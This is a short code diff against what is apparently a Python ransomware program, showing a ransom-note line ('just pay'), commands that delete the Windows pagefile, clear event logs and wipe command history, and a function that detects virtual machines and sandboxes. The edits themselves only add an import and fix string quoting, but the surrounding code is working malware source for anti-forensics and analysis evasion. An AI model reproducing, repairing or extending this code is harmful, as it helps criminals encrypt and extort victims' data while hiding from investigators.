@@ -30,6 +30,7 @@ import py7zr
 import requests
 import winshell
 from Crypto.Cipher import AES  # hidden import
+from colorama import Fore  # hidden import
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
@@ -557,7 +558,7 @@ Don't Cry, just pay =)))"""
         'wmic computersystem where name="%computername%" set AutomaticManagedPagefile=False'
     )
     execute_command(
-        f"wmic pagefileset where \"name='{os.getenv("SystemDrive")}\\pagefile.sys'\" delete"
+        f"wmic pagefileset where \"name='{os.getenv('SystemDrive')}\\pagefile.sys'\" delete"
     )
     clear_event_logs()
     execute_command("doskey /listsize=0")
@@ -607,12 +608,12 @@ def disable_all():
 
 def is_vm():
     paths = [
-        rf"{os.getenv("SystemDrive")}\Program Files\VMware\VMware Tools",
-        rf"{os.getenv("SystemDrive")}\Program Files\Oracle\VirtualBox Guest Additions",
-        rf"{os.getenv("SystemDrive")}\Windows\System32\drivers\VBoxGuest.sys",
-        rf"{os.getenv("SystemDrive")}\Windows\System32\drivers\VBoxMouse.sys",
-        rf"{os.getenv("SystemDrive")}\Windows\System32\drivers\VBoxSF.sys",
-        rf"{os.getenv("SystemDrive")}\Program Files\WindowsApps\Microsoft.WindowsSandbox_",
+        rf"{os.getenv('SystemDrive')}\Program Files\VMware\VMware Tools",
+        rf"{os.getenv('SystemDrive')}\Program Files\Oracle\VirtualBox Guest Additions",
+        rf"{os.getenv('SystemDrive')}\Windows\System32\drivers\VBoxGuest.sys",
+        rf"{os.getenv('SystemDrive')}\Windows\System32\drivers\VBoxMouse.sys",
+        rf"{os.getenv('SystemDrive')}\Windows\System32\drivers\VBoxSF.sys",
+        rf"{os.getenv('SystemDrive')}\Program Files\WindowsApps\Microsoft.WindowsSandbox_",
     ]
     vms = [
         "Virtual",
